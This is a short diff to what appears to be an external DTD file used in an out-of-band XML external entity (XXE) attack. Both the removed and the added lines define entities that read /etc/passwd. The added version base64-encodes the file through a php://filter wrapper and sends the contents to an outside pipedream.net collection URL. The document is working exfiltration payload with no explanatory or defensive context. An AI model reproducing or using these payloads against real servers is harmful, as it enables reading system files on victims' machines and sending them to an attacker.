@@ -1,2 +1,3 @@
-<!ENTITY % file SYSTEM "file://etc/passwd">
-<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enhux2ryxst1b.x.pipedream.net/?%file;'>">
+<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'https://enhux2ryxst1b.x.pipedream.net/result-is?%payl;'>">
+<!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'file://%payl;'>">
